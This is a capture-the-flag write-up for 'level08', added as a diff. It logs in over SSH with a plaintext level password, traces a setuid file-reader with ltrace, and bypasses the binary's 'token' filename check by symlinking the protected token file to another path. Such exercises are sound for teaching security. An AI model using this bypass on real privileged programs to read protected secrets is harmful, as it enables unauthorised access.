@@ -1,0 +1,65 @@
+# 08
+
+Login
+
+```b
+> ssh level08@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: fiumuikeil55xe9cu4dood66h
+> ls -l
+-rwsr-s---+ 1 flag08 level08 8617 level08
+-rw-------  1 flag08 flag08    26 token
+```
+
+2 files:
+
+```b
+> cat token
+cat: token: Permission denied
+
+> ./level08
+./level08 [file to read]
+```
+
+Tryout
+
+```b
+# run it
+
+> echo "a" > /tmp/tmp && ./level08 /tmp/tmp
+a
+> echo "aB" > /tmp/tmp && ./level08 /tmp/tmp
+aB
+
+# ltrace
+
+> ltrace ./level08 /tmp
+__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp", "token")                                    = NULL
+^^^^^^          ^^^^^ 🟡
+open("/tmp", 0, 014435162522)                              = -1
+err(1, 0x80487b2, 0xbffff90a, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open /tmp: Permission denied
+ <unfinished ...>
++++ exited (status 1) +++
+
+> ltrace ./level08 /tmp/tmp
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/tmp", "token")                                = NULL
+^^^^^^              ^^^^^ 🟡
+open("/tmp/tmp", 0, 014435162522)                          = 3
+read(3, "aB\n", 1024)                                      = 3
+write(1, "aB\n", 3aB
+)                                        = 3
++++ exited (status 3) +++
+```
+
+Observation:
+- it reads the contents of a file
+- as long as the filename contains no "token" as substr
+- renaming `./token` is not allowed
+- but we can make a symlink of it
+  - syntax: `ln -s real_path_src real_path_symlink`
+
+Solution
+```b
+> ln -s `realpath token` /tmp/tok
+```
